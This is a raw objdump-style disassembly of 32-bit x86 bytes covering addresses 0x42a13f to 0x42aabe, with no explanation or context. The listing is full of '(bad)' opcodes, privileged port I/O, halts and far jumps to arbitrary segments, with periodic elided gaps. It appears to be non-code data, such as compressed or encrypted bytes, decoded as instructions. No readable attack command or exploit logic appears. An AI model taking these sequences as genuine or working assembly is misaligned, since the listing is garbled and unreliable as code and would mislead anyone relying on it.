  42a13f:	and    al,0xbf
  42a141:	xor    esi,eax
  42a143:	mov    ds:0x16e9b304,eax
  42a148:	mov    esi,0x5ce9351a
  42a14d:	out    dx,eax
  42a14e:	xchg   DWORD PTR [ecx+edx*2-0x70d88293],esp
  42a155:	out    dx,al
  42a156:	mov    dh,0x72
  42a158:	mov    ebp,DWORD PTR [ecx+0x34]
  42a15b:	loop   0x42a13c
  42a15d:	fwait
  42a15e:	push   ebx
  42a15f:	mov    bh,0xf9
  42a161:	retf   0x7de9
  42a164:	fst    DWORD PTR [ecx]
  42a166:	loopne 0x42a13c
  42a168:	les    ebx,FWORD PTR [edi]
  42a16a:	pop    edx
  42a16b:	in     al,0x99
  42a16d:	pop    ss
  42a16e:	mov    ds:0x9945b1de,al
  42a173:	popa   
  42a174:	mov    ah,0xd8
  42a176:	lds    edx,FWORD PTR [edx-0x6a]
  42a179:	(bad)
  42a17c:	les    ecx,FWORD PTR [ecx-0x6c8018f]
  42a182:	mov    ebp,0x432e5231
  42a187:	out    0xe1,eax
  42a189:	push   esp
  42a18a:	sub    DWORD PTR [eax-0x1a],ebx
  42a18d:	sub    dl,al
  42a18f:	mov    BYTE PTR ds:0x6db0dc02,dh
  42a195:	cld    
  42a196:	sar    DWORD PTR es:[eax],0x88
  42a19a:	call   0x1a6ec1e6
  42a19f:	cmp    BYTE PTR [ebx-0x76],al
  42a1a2:	call   0x24a3:0xc8789897
  42a1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1aa:	xor    al,0xd
  42a1ac:	(bad)  
  42a1ad:	jnp    0x42a1e3
  42a1af:	push   edx
  42a1b0:	add    eax,0x96fffbd7
  42a1b5:	mov    al,0xed
  42a1b7:	cwde   
  42a1b8:	xlat   BYTE PTR ds:[ebx]
  42a1b9:	jp     0x42a165
  42a1bb:	cdq    
  42a1bc:	test   DWORD PTR [edi],esi
  42a1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1bf:	stos   DWORD PTR es:[edi],eax
  42a1c0:	pop    ebp
  42a1c1:	hlt    
  42a1c2:	ss push ebx
  42a1c4:	repz repnz inc esp
  42a1c7:	ins    DWORD PTR es:[edi],dx
  42a1c8:	call   0x40ee:0xe3fae7c5
  42a1cf:	adc    eax,0x148fcfdf
  42a1d4:	hlt    
  42a1d5:	xchg   esp,eax
  42a1d6:	mov    ch,BYTE PTR [eax-0x3a]
  42a1d9:	sahf   
  42a1da:	into   
  42a1db:	cmp    cl,BYTE PTR ds:0xeac1de54
  42a1e1:	pop    ebp
  42a1e2:	imul   ebx,eax,0xffffff92
  42a1e5:	xchg   esi,eax
  42a1e6:	pop    esp
  42a1e7:	in     al,dx
  42a1e8:	xchg   ebx,eax
  42a1e9:	mov    BYTE PTR [edx-0x6d85579e],dl
  42a1ef:	xchg   edx,eax
  42a1f0:	mov    bl,0x7
  42a1f2:	xchg   esp,eax
  42a1f3:	enter  0xee2,0x94
  42a1f7:	mov    al,ds:0xe183c035
  42a1fc:	sbb    ebp,esi
  42a1fe:	xchg   ebp,eax
  42a1ff:	or     eax,0x3e82574d
  42a204:	push   0x5953c235
  42a209:	sbb    eax,0x2406cbaf
  42a20e:	xor    esi,esp
  42a210:	mov    ebp,0x0
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	(bad)  [ecx+0x7d95974f]
  42a285:	ret    
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0x41000001
  42a28d:	mov    ah,0xea
  42a28f:	int    0xb0
  42a291:	and    ebx,DWORD PTR [esi+0x2be45722]
  42a297:	pushf  
  42a298:	in     eax,dx
  42a299:	mov    ebp,0x1dd11c35
  42a29e:	push   ecx
  42a29f:	sub    esi,DWORD PTR [ebp+0x71]
  42a2a2:	fs pop ebp
  42a2a4:	push   edx
  42a2a5:	imul   edi,DWORD PTR [eax],0x37
  42a2a8:	aaa    
  42a2a9:	or     esi,eax
  42a2ab:	adc    al,0x88
  42a2ad:	mov    ecx,0x89b58c93
  42a2b2:	mov    esi,0x2ad47b66
  42a2b7:	add    BYTE PTR [eax-0x55],ch
  42a2ba:	aaa    
  42a2bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2bc:	pop    edx
  42a2bd:	xor    dh,BYTE PTR [ebx+0x43e6a138]
  42a2c3:	les    esp,FWORD PTR [ebx+0x38d32ad1]
  42a2c9:	push   eax
  42a2ca:	mov    bl,0xb3
  42a2cc:	pushf  
  42a2cd:	sub    dh,BYTE PTR [esi+0x2a]
  42a2d0:	inc    ebp
  42a2d1:	adc    al,0x65
  42a2d3:	xchg   ecx,eax
  42a2d4:	mov    edx,0x45c708b
  42a2d9:	fcom   DWORD PTR [ecx+0x1b459445]
  42a2df:	and    eax,DWORD PTR [edx]
  42a2e1:	push   edx
  42a2e2:	in     al,dx
  42a2e3:	cmp    edx,esp
  42a2e5:	cli    
  42a2e6:	xor    cl,BYTE PTR [eax+edi*8+0x744e897f]
  42a2ed:	xor    BYTE PTR [eax-0x1a],ah
  42a2f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2f1:	inc    edx
  42a2f2:	jge    0x42a345
  42a2f4:	xchg   edi,eax
  42a2f5:	mov    bh,0x58
  42a2f7:	mov    dl,0x21
  42a2f9:	sub    eax,0x69e2365a
  42a2fe:	mov    BYTE PTR [eax],cl
  42a300:	rcr    DWORD PTR [esi-0x4b],1
  42a303:	addr16 idiv esi
  42a306:	aam    0x4e
  42a308:	ja     0x42a381
  42a30a:	mov    esi,0xac81791a
  42a30f:	in     al,0xf5
  42a311:	(bad)  
  42a312:	jle    0x42a2b5
  42a314:	fmul   QWORD PTR [esi-0x7745000d]
  42a31a:	jb     0x42a30a
  42a31c:	and    eax,0x6dd8f1e9
  42a321:	daa    
  42a322:	ss pop esp
  42a324:	call   0x44d59110
  42a329:	and    BYTE PTR [esi-0x4e4ce61a],0x6d
  42a330:	add    al,BYTE PTR [esi+0x2506aa12]
  42a336:	rol    bh,0x85
  42a339:	mov    dh,0x3a
  42a33b:	repnz dec edi
  42a33d:	retf   
  42a33e:	mov    ds:0x9fd3e7a7,al
  42a343:	inc    eax
  42a344:	or     DWORD PTR [ecx],eax
  42a346:	mov    bl,0xae
  42a348:	sub    al,0x85
  42a34a:	cmp    ecx,eax
  42a34c:	adc    eax,0xe84b4232
  42a351:	sbb    esp,DWORD PTR [ebp+0x4f7e1c19]
  42a357:	pusha  
  42a358:	jle    0x42a31f
  42a35a:	mov    eax,0x7b24d503
  42a35f:	xchg   esp,eax
  42a360:	fisub  WORD PTR [ebx-0x6d]
  42a363:	lock aad 0xce
  42a366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a367:	sub    BYTE PTR [ebx+0x7c],0xf0
  42a36b:	pusha  
  42a36c:	lock mov ds:0x667ad485,eax
  42a372:	dec    ebp
  42a373:	add    DWORD PTR [ecx+0x70],0xffffffd1
  42a377:	push   esi
  42a378:	lea    edx,[ebp-0x19]
  42a37b:	ret    
  42a37c:	mov    ah,0x7f
  42a37e:	(bad)  
  42a37f:	ds inc eax
  42a381:	sbb    eax,ebp
  42a383:	int3   
  42a384:	scas   eax,DWORD PTR es:[edi]
  42a385:	int3   
  42a386:	mov    esi,0x888e8a17
  42a38b:	jp     0x42a3ed
  42a38d:	mov    WORD PTR [edi+0xc488],fs
	...
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x2078513d
  42a403:	push   ss
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0x13000001,al
  42a40d:	test   BYTE PTR [ecx-0x5edf419f],ah
  42a413:	pop    esp
  42a414:	dec    edx
  42a415:	(bad)  
  42a416:	clc    
  42a417:	push   esp
  42a418:	push   es
  42a419:	cs ja  0x42a487
  42a41c:	ret    
  42a41d:	adc    al,0x40
  42a41f:	pop    edi
  42a420:	clc    
  42a421:	sar    BYTE PTR [ecx+0x6d],1
  42a424:	(bad)  
  42a425:	push   eax
  42a426:	xchg   edx,eax
  42a427:	popf   
  42a428:	jo     0x42a45b
  42a42a:	(bad)  
  42a42c:	in     al,0xb9
  42a42e:	outs   dx,DWORD PTR ds:[esi]
  42a42f:	jl     0x42a3b1
  42a431:	mov    dl,0x82
  42a433:	pop    edi
  42a434:	iret   
  42a435:	adc    BYTE PTR [edx],ah
  42a437:	xchg   edi,eax
  42a438:	jecxz  0x42a42c
  42a43a:	adc    bl,BYTE PTR [ebx]
  42a43c:	cmp    ebx,DWORD PTR [ebp-0x6ffd292e]
  42a442:	push   es
  42a443:	add    DWORD PTR [eax-0x60],edx
  42a446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a447:	or     eax,0x3bea3286
  42a44c:	out    0x7e,al
  42a44e:	dec    ebx
  42a44f:	nop
  42a450:	and    DWORD PTR [eax],ebx
  42a452:	lea    ebp,[edx+0x51]
  42a455:	mov    ebp,0x1a766998
  42a45a:	stos   DWORD PTR es:[edi],eax
  42a45b:	repnz push eax
  42a45d:	sbb    eax,0x9ec52983
  42a462:	(bad)  
  42a464:	sub    dl,BYTE PTR [eax+0x64]
  42a467:	std    
  42a468:	mov    eax,ds:0xb876fb41
  42a46d:	or     edx,DWORD PTR [edx-0x2f]
  42a470:	cmp    DWORD PTR [eax+0x77],edx
  42a473:	pop    eax
  42a474:	mov    esp,0xa97fe075
  42a479:	jmp    0x42a4d6
  42a47b:	ss mov esi,0xa849866d
  42a481:	cld    
  42a482:	add    esp,esi
  42a484:	pop    edx
  42a485:	add    DWORD PTR [ecx+edi*4-0xb],esp
  42a489:	retf   0x3839
  42a48c:	ret    0x6335
  42a48f:	imul   esi,DWORD PTR [esi-0x730a558a],0xffffffe3
  42a496:	je     0x42a4c0
  42a498:	es mov ecx,0x690da3ff
  42a49e:	jb     0x42a44b
  42a4a0:	pop    edx
  42a4a1:	pushf  
  42a4a2:	addr16 test edx,ecx
  42a4a5:	inc    ecx
  42a4a6:	lods   al,BYTE PTR ds:[esi]
  42a4a7:	push   esp
  42a4a8:	pop    edx
  42a4a9:	add    bl,BYTE PTR [ecx]
  42a4ab:	mov    ds:0x6a5a2973,al
  42a4b0:	stc    
  42a4b1:	sub    BYTE PTR [eax],bh
  42a4b3:	add    DWORD PTR [ebp+0x2e1006b4],0x78
  42a4ba:	fucomp st(7)
  42a4bc:	cwde   
  42a4bd:	ret    0xb0a8
  42a4c0:	aam    0x1e
  42a4c2:	mov    al,0xcc
  42a4c4:	sbb    eax,0xfb1245b1
  42a4c9:	test   al,0x60
  42a4cb:	pop    ebp
  42a4cc:	mov    ds,WORD PTR [esi-0x28]
  42a4cf:	aas    
  42a4d0:	inc    esi
  42a4d1:	ja     0x42a4c3
  42a4d3:	rcl    DWORD PTR [eax],cl
  42a4d5:	adc    ebp,DWORD PTR ds:0x8d67813e
  42a4db:	cdq    
  42a4dc:	stc    
  42a4dd:	popa   
  42a4de:	lock (bad) 
  42a4e0:	mov    es,WORD PTR [ecx-0x1c]
  42a4e3:	iret   
  42a4e4:	jge    0x42a561
  42a4e6:	and    eax,0x1fad8ebb
  42a4eb:	ret    
  42a4ec:	gs out 0x77,eax
  42a4ef:	xor    edi,DWORD PTR [eax-0x34]
  42a4f2:	clc    
  42a4f3:	mov    edi,0x8ed59
  42a4f8:	out    dx,al
  42a4f9:	lds    ecx,FWORD PTR [edx]
  42a4fb:	jnp    0x42a4bd
  42a4fd:	(bad)  
  42a4fe:	in     eax,dx
  42a4ff:	xchg   ebx,eax
  42a500:	sub    eax,0xd49d57fa
  42a505:	popa   
  42a506:	push   edi
  42a507:	(bad)  
  42a508:	leave  
  42a509:	xchg   BYTE PTR gs:[edi-0x60],bl
  42a50d:	inc    edi
  42a50e:	jne    0x42a4eb
  42a510:	test   BYTE PTR [eax],al
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x286a369f
  42a583:	push   edx
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0x7f000001
  42a58d:	mov    es,WORD PTR [ebx+0x6cb8c09a]
  42a593:	lock add DWORD PTR [ebp+0x18],edx
  42a597:	jnp    0x42a54f
  42a599:	ror    DWORD PTR [ebp-0x42],1
  42a59c:	pop    edx
  42a59d:	retf   
  42a59e:	xchg   edi,eax
  42a59f:	arpl   si,si
  42a5a1:	cmp    BYTE PTR [esi-0x2d],ah
  42a5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5a5:	nop
  42a5a6:	jecxz  0x42a5d8
  42a5a8:	mov    ah,ah
  42a5aa:	pop    ebp
  42a5ab:	popw   es
  42a5ad:	imul   esp,eax,0x1467b854
  42a5b3:	dec    ebp
  42a5b4:	and    BYTE PTR [ecx+0x7de56641],ch
  42a5ba:	arpl   WORD PTR [esi],si
  42a5bc:	pusha  
  42a5bd:	cmp    al,0xf6
  42a5bf:	aaa    
  42a5c0:	xor    BYTE PTR ds:0xfa53a5ec,ah
  42a5c6:	inc    ecx
  42a5c7:	cmp    BYTE PTR [ecx],0xaf
  42a5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a5cb:	cli    
  42a5cc:	out    0xaa,eax
  42a5ce:	sbb    esp,eax
  42a5d0:	out    0x25,al
  42a5d2:	mov    BYTE PTR ds:0xc1febc2d,cl
  42a5d8:	inc    edx
  42a5d9:	ins    BYTE PTR es:[edi],dx
  42a5da:	not    eax
  42a5dc:	inc    edi
  42a5dd:	and    al,0x9e
  42a5df:	push   esi
  42a5e0:	xchg   ebx,eax
  42a5e1:	mov    ebx,0xc847bd3e
  42a5e6:	jbe    0x42a658
  42a5e8:	enter  0xcef6,0x1f
  42a5ec:	push   ecx
  42a5ed:	fnsave [edx-0x7c1a4bbf]
  42a5f3:	adc    eax,0xbf790a2c
  42a5f8:	and    eax,DWORD PTR [ebp+eiz*1-0x7a0e7fa2]
  42a5ff:	inc    ecx
  42a600:	int3   
  42a601:	out    dx,al
  42a602:	adc    al,0x30
  42a604:	(bad)  
  42a606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a607:	mov    esi,0x84958617
  42a60c:	ss nop
  42a60e:	fdiv   DWORD PTR [ebx+0x29]
  42a611:	ret    
  42a612:	mov    al,ds:0x81b3c1ff
  42a617:	inc    ecx
  42a618:	lahf   
  42a619:	mov    ch,0x5f
  42a61b:	(bad)  
  42a61c:	int    0xd9
  42a61e:	gs sbb eax,0x905d8715
  42a624:	sar    DWORD PTR cs:[ebx],0x91
  42a628:	hlt    
  42a629:	sub    al,0x79
  42a62b:	jl     0x42a662
  42a62d:	call   0x14ab:0xa87aa012
  42a634:	stc    
  42a635:	popf   
  42a636:	in     al,dx
  42a637:	hlt    
  42a638:	(bad)  
  42a639:	fcomp  st(2)
  42a63b:	xor    dl,ah
  42a63d:	ins    BYTE PTR es:[edi],dx
  42a63e:	sbb    DWORD PTR [edi+ebx*8-0x4136fe6b],0xffffffcd
  42a646:	jno    0x42a61d
  42a648:	inc    edx
  42a649:	imul   ebp,DWORD PTR [ebx],0x5e
  42a64c:	sti    
  42a64d:	sahf   
  42a64e:	push   ecx
  42a64f:	or     DWORD PTR [ebx],ebp
  42a651:	mov    esi,0xa9d44f2d
  42a656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a657:	shl    BYTE PTR [ebx],1
  42a659:	repz mov edx,0xd6d4565d
  42a65f:	mov    fs,ebp
  42a661:	neg    BYTE PTR [edx]
  42a663:	ror    DWORD PTR [eax-0x1a],1
  42a666:	inc    esp
  42a667:	jne    0x42a681
  42a669:	loopne 0x42a6ca
  42a66b:	es or  al,0xcd
  42a66e:	sub    ebx,DWORD PTR [esi]
  42a670:	jmp    0x5dcc:0xbf7ce4c3
  42a677:	mov    al,0xcf
  42a679:	cwde   
  42a67a:	pop    ebx
  42a67b:	nop
  42a67c:	fs sub dh,cl
  42a67f:	stos   DWORD PTR es:[edi],eax
  42a680:	std    
  42a681:	dec    ebx
  42a682:	mov    bl,0xec
  42a684:	push   cs
  42a685:	shl    DWORD PTR [esi+ecx*1+0x4b],cl
  42a689:	rcl    DWORD PTR [ebp+0x38a952e0],0xef
  42a690:	retf   0x0
	...
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x5c47ece4],0x8cc4d543
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xbe000001
  42a70d:	inc    eax
  42a70e:	into   
  42a70f:	dec    ebx
  42a710:	ins    BYTE PTR es:[edi],dx
  42a711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a712:	push   0x22
  42a714:	pop    es
  42a715:	xor    DWORD PTR [esi],esp
  42a717:	scas   al,BYTE PTR es:[edi]
  42a718:	cmp    al,ah
  42a71a:	js     0x42a750
  42a71c:	sub    DWORD PTR [edx],0xffffffb8
  42a71f:	mov    bl,0x70
  42a721:	imul   eax,DWORD PTR [ecx-0x75],0x72131712
  42a728:	lods   al,BYTE PTR ds:[esi]
  42a729:	mov    edx,0x43b5b12d
  42a72e:	push   esp
  42a72f:	jmp    0x42a6f6
  42a731:	pop    edi
  42a732:	or     edi,DWORD PTR [edx+edx*4+0x12c14dc6]
  42a739:	push   0xeed6b27a
  42a73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a73f:	aas    
  42a740:	jp     0x42a706
  42a742:	jmp    0x5c7ed648
  42a747:	xlat   BYTE PTR ds:[ebx]
  42a748:	jp     0x42a799
  42a74a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42a74c:	mov    ds:0xe84f382b,al
  42a751:	pop    ss
  42a752:	cs js  0x42a71e
  42a755:	retf   
  42a756:	or     edx,DWORD PTR [ebp+0x5c]
  42a759:	dec    esi
  42a75a:	jg     0x42a77a
  42a75c:	ret    
  42a75d:	ret    0x4e1d
  42a760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a761:	push   ebp
  42a762:	fld    QWORD PTR [eax+eiz*2]
  42a765:	sub    DWORD PTR [edx+0x5a9dce88],eax
  42a76b:	pop    edi
  42a76c:	mov    WORD PTR [ecx-0x33],es
  42a76f:	retf   
  42a770:	pop    ecx
  42a771:	add    eax,0x2b9bff7b
  42a776:	in     al,0xaa
  42a778:	add    BYTE PTR [edi],bh
  42a77a:	xor    BYTE PTR [esi+0x308c2305],ch
  42a780:	xchg   edi,eax
  42a781:	xchg   ebp,ebp
  42a783:	xchg   DWORD PTR [esi-0x63],edx
  42a786:	jecxz  0x42a7d3
  42a788:	mov    es,WORD PTR [edi+0x476c2726]
  42a78e:	xchg   ebp,eax
  42a78f:	aas    
  42a790:	dec    ebp
  42a791:	nop
  42a792:	cli    
  42a793:	mov    DWORD PTR [eax],edx
  42a795:	lahf   
  42a796:	pop    ebx
  42a797:	das    
  42a798:	(bad)  
  42a799:	sub    eax,0x9ea4e997
  42a79e:	sbb    eax,0xee1d18b4
  42a7a3:	pop    eax
  42a7a4:	gs (bad) 
  42a7a6:	pop    edx
  42a7a7:	mov    eax,0xb5ceaf35
  42a7ac:	out    0xb0,eax
  42a7ae:	jmp    0x74623280
  42a7b3:	mov    ds:0xdc62da9f,eax
  42a7b8:	inc    esp
  42a7b9:	xor    DWORD PTR [esi+0x6],esp
  42a7bc:	shr    BYTE PTR [edx],cl
  42a7be:	dec    ebp
  42a7bf:	rcr    DWORD PTR [ecx+0x4a],0x6a
  42a7c3:	pop    DWORD PTR [ebp-0x675b52d1]
  42a7c9:	jbe    0x42a829
  42a7cb:	adc    eax,0x2b88cb0d
  42a7d0:	sar    bl,1
  42a7d2:	jmp    0x3cd4e877
  42a7d7:	pop    ebp
  42a7d8:	dec    ebp
  42a7d9:	xchg   esi,eax
  42a7da:	xor    BYTE PTR [ecx],dl
  42a7dc:	shl    BYTE PTR [eax],cl
  42a7de:	nop
  42a7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7e0:	sub    BYTE PTR [ecx+0x11],bl
  42a7e3:	std    
  42a7e4:	and    ebp,esi
  42a7e6:	inc    esi
  42a7e7:	retf   0x18d1
  42a7ea:	sub    edi,esp
  42a7ec:	mov    dl,0x1c
  42a7ee:	scas   al,BYTE PTR es:[edi]
  42a7ef:	jl     0x42a7e3
  42a7f1:	pop    edi
  42a7f2:	jns    0x42a7c4
  42a7f4:	mov    edi,0x6c5bcdb4
  42a7f9:	data16 outs dx,BYTE PTR ds:[esi]
  42a7fb:	ins    BYTE PTR es:[edi],dx
  42a7fc:	mov    bh,BYTE PTR ds:0xeba51aba
  42a802:	loopne 0x42a83f
  42a804:	ins    DWORD PTR es:[edi],dx
  42a805:	test   DWORD PTR [edi],esp
  42a807:	pushf  
  42a808:	div    BYTE PTR [edi-0x52aee945]
  42a80e:	int    0xe
  42a810:	ins    BYTE PTR es:[edi],dx
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	add    BYTE PTR [ebx-0x386eb32c],cl
  42a886:	add    DWORD PTR [eax],eax
  42a888:	add    eax,0x27000001
  42a88d:	pop    esi
  42a88e:	add    al,0x54
  42a890:	jl     0x42a8c7
  42a892:	loop   0x42a8c7
  42a894:	push   esp
  42a895:	sub    BYTE PTR [esi+ecx*2+0x668b3822],dl
  42a89c:	mov    dl,BYTE PTR [ebx]
  42a89e:	icebp  
  42a89f:	mov    ecx,0x3416932b
  42a8a4:	sbb    eax,DWORD PTR fs:[ecx]
  42a8a7:	mov    DWORD PTR [esi-0x2a],ebp
  42a8aa:	adc    BYTE PTR [edx+0x67],al
  42a8ad:	in     al,dx
  42a8ae:	dec    edi
  42a8af:	or     eax,0xfcda471c
  42a8b4:	dec    ecx
  42a8b5:	cmp    eax,0x855d1a3a
  42a8ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8bb:	push   ecx
  42a8bc:	mov    ebp,0xea146b21
  42a8c1:	xlat   BYTE PTR ds:[ebx]
  42a8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8c3:	lock lds edi,FWORD PTR [ecx-0x25c54d48]
  42a8ca:	sti    
  42a8cb:	jle    0x42a87a
  42a8cd:	sub    ebx,DWORD PTR [esi]
  42a8cf:	leave  
  42a8d0:	not    ch
  42a8d2:	sahf   
  42a8d3:	sar    BYTE PTR ds:0xe6bc284c,1
  42a8d9:	repz dec edi
  42a8db:	cwd    
  42a8dd:	cmp    edx,DWORD PTR [ebx-0x69cd30b]
  42a8e3:	call   0xdd2bd128
  42a8e8:	das    
  42a8e9:	ret    
  42a8ea:	in     eax,0xb5
  42a8ec:	ja     0x42a8a1
  42a8ee:	mov    ecx,0x39f547f3
  42a8f3:	jl     0x42a948
  42a8f5:	repz push 0xd4eece03
  42a8fb:	push   ebx
  42a8fc:	retf   0xa241
  42a8ff:	sar    cl,cl
  42a901:	inc    esp
  42a902:	dec    eax
  42a903:	and    ecx,ebp
  42a905:	nop
  42a906:	mov    ch,0x73
  42a908:	and    bh,BYTE PTR [ebx-0x39]
  42a90b:	dec    BYTE PTR [eax+0x30e66c71]
  42a911:	and    DWORD PTR [eax+edi*2-0x28],ebp
  42a915:	js     0x42a8d3
  42a917:	fdivr  st,st(2)
  42a919:	jmp    0x42a971
  42a91b:	ret    0xc6c
  42a91e:	cmp    al,0x2
  42a920:	jb     0x42a908
  42a922:	lods   eax,DWORD PTR ds:[esi]
  42a923:	test   DWORD PTR [ecx+0x4d706236],ebx
  42a929:	pop    ss
  42a92a:	xchg   ebp,eax
  42a92b:	mov    edx,0xd06c1a8b
  42a930:	push   cs
  42a931:	push   ebx
  42a932:	cmp    ecx,edi
  42a934:	fcomp  DWORD PTR [eax+0x7]
  42a937:	sub    ebp,DWORD PTR [esi]
  42a939:	and    eax,0x74b0bc1d
  42a93e:	dec    esp
  42a93f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a940:	mov    ah,BYTE PTR [edi+edx*1-0x34]
  42a944:	rcl    BYTE PTR [ecx],cl
  42a946:	pop    ebp
  42a947:	xchg   esi,eax
  42a948:	push   ss
  42a949:	push   es
  42a94a:	inc    edx
  42a94b:	add    eax,0xd1347d9c
  42a950:	jmp    0xbb17:0x404ecbcd
  42a957:	or     ebx,0x2c
  42a95a:	std    
  42a95b:	push   ss
  42a95c:	aam    0xa2
  42a95e:	xchg   DWORD PTR gs:[ebp+0x4d],esp
  42a962:	sub    DWORD PTR ds:0xacdf2f9c,eax
  42a968:	or     al,0x65
  42a96a:	push   ss
  42a96b:	popa   
  42a96c:	cmp    ch,BYTE PTR [edx]
  42a96e:	test   eax,0xc7fb54e5
  42a973:	xchg   edx,ecx
  42a975:	das    
  42a976:	into   
  42a977:	mov    ch,0xd9
  42a979:	jb     0x42a9be
  42a97b:	in     al,0xb6
  42a97d:	addr16 dec ecx
  42a97f:	mov    eax,0xf4e4a6ee
  42a984:	sbb    eax,0x36d4abeb
  42a989:	repz addr16 inc ebx
  42a98c:	fisub  DWORD PTR [ecx+0x6e]
  42a98f:	mov    dl,0x96
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	and    dl,cl
  42aa02:	xor    DWORD PTR [ebp-0x6a],edx
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [edi],dl
  42aa0d:	cld    
  42aa0e:	mov    dh,0xf2
  42aa10:	cwde   
  42aa11:	cli    
  42aa12:	cmp    bh,BYTE PTR [eax]
  42aa14:	lods   al,BYTE PTR ds:[esi]
  42aa15:	das    
  42aa16:	test   eax,0xfb0ca60d
  42aa1b:	ins    DWORD PTR es:[edi],dx
  42aa1c:	pusha  
  42aa1d:	inc    edi
  42aa1e:	fbld   TBYTE PTR [ebx-0x50c77f99]
  42aa24:	jmp    0x9dd2fd17
  42aa29:	sti    
  42aa2a:	dec    esi
  42aa2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa2c:	fdivr  QWORD PTR [eax+0x3d]
  42aa2f:	xchg   edx,edi
  42aa31:	adc    dh,BYTE PTR ds:0x2a29e037
  42aa37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa38:	mov    esi,0xf9fb557c
  42aa3d:	mov    cl,0x29
  42aa3f:	xchg   ecx,eax
  42aa40:	ficomp DWORD PTR ds:0xf15071d9
  42aa46:	xor    BYTE PTR [ecx],0x18
  42aa49:	lods   eax,DWORD PTR ds:[esi]
  42aa4a:	arpl   bx,dx
  42aa4c:	popa   
  42aa4d:	push   ebp
  42aa4e:	jmp    0xb925:0x99208a01
  42aa55:	pop    es
  42aa56:	outs   dx,BYTE PTR ds:[esi]
  42aa57:	cmp    edx,ecx
  42aa59:	push   esi
  42aa5a:	xor    BYTE PTR [edx+esi*2-0x4313eeb4],ah
  42aa61:	sbb    bh,BYTE PTR [ebx]
  42aa63:	enter  0x429a,0x25
  42aa67:	sub    DWORD PTR [ecx+0x3a],ebx
  42aa6a:	cmp    BYTE PTR [esi-0x25c8df72],cl
  42aa70:	(bad)  
  42aa71:	int    0x85
  42aa73:	and    al,0x69
  42aa75:	and    al,0xe7
  42aa77:	push   edx
  42aa78:	xlat   BYTE PTR ds:[ebx]
  42aa79:	mov    ch,0x63
  42aa7b:	push   esp
  42aa7c:	retf   
  42aa7d:	stos   DWORD PTR es:[edi],eax
  42aa7e:	xlat   BYTE PTR ds:[ebx]
  42aa7f:	add    eax,0xce440c0e
  42aa84:	adc    al,BYTE PTR [edi]
  42aa86:	jnp    0x42aa33
  42aa88:	xchg   ebp,eax
  42aa89:	rcr    ecx,0x55
  42aa8c:	pop    esp
  42aa8d:	mov    esi,es
  42aa8f:	sti    
  42aa90:	scas   eax,DWORD PTR es:[edi]
  42aa91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa92:	xor    al,0xb7
  42aa94:	and    DWORD PTR [edi+0x4f],0xfffffffb
  42aa98:	inc    esp
  42aa99:	and    esp,eax
  42aa9b:	mov    ds:0x9fd5c3c,al
  42aaa0:	mov    ebx,DWORD PTR [bp-0x2a]
  42aaa4:	popf   
  42aaa5:	in     al,0x20
  42aaa7:	inc    eax
  42aaa8:	stos   BYTE PTR es:[edi],al
  42aaa9:	add    DWORD PTR [eax],ebp
  42aaab:	and    bh,dl
  42aaad:	ds aaa 
  42aaaf:	fs mov al,0xd4
  42aab2:	xchg   esi,eax
  42aab3:	stc    
  42aab4:	jle    0x42aaae
  42aab6:	pushf  
  42aab7:	imul   edi,edi,0x98af82e7
  42aabd:	dec    ecx
  42aabe:	(bad)  
